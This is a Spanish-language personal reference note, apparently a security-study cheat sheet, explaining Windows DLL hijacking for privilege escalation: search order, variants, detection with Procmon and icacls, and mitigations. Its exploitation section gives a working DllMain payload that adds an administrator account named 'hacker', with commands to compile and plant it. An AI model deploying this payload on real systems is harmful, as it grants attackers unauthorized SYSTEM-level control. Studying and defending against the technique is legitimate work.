#reference #Ciberseguridad

**DLL Hijacking** (privesc) = forzar a un proceso **privilegiado** a cargar una DLL maliciosa colocándola donde Windows la busca antes que la legítima. Si un servicio que corre como SYSTEM carga una DLL por nombre desde una ruta escribible → ejecución como SYSTEM.

# Orden de búsqueda de DLLs

Con SafeDllSearchMode (por defecto) Windows busca en:

```
1. Directorio de la aplicación
2. System32  (C:\Windows\System32)
3. System16
4. Windows
5. Directorio actual (CWD)
6. Directorios del PATH
```

El hueco aparece cuando un directorio **anterior al legítimo** es **escribible** por el atacante, o la DLL **no existe** y se busca en rutas escribibles.

# Variantes

| Variante | Idea |
|----------|------|
| **Missing DLL** | El proceso pide una DLL que no existe → plantar la nuestra en una ruta de búsqueda. |
| **Writable path** | Un dir del PATH/aplicación es escribible → sobrescribir/anteponer DLL. |
| **DLL proxying** | Nuestra DLL reenvía exports a la real para no romper la app. |
| **Phantom DLL** | DLL que el SO busca pero nunca instaló. |

# Detección del vector

```
# Procmon (Sysinternals): filtrar
Result = NAME NOT FOUND  +  Path ends with .dll
# -> DLLs que el proceso busca y no encuentra
```

Buscar rutas escribibles en el PATH:
```powershell
$env:Path -split ';' | % { icacls $_ } 2>$null   # ver permisos de cada dir
```

# Explotación

```c
// DLL mínima: ejecuta al cargarse (DllMain)
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH)
        system("cmd.exe /c net user hacker P@ss /add && net localgroup administrators hacker /add");
    return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc evil.c -shared -o legit.dll
# Plantar legit.dll en la ruta escribible y reiniciar el servicio
```

# Mitigación

DLLs con ruta absoluta, firmar binarios, quitar permisos de escritura en dirs del PATH/aplicación, `SafeDllSearchMode=1`, evitar CWD en la búsqueda.

# Recursos
### [[DLL Hijacking Persistencia]] · [[LinPE_cheatsheet]]
### [HackTricks — Writable path DLL hijacking](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dll-hijacking/writable-sys-path-dll-hijacking-privesc.html)
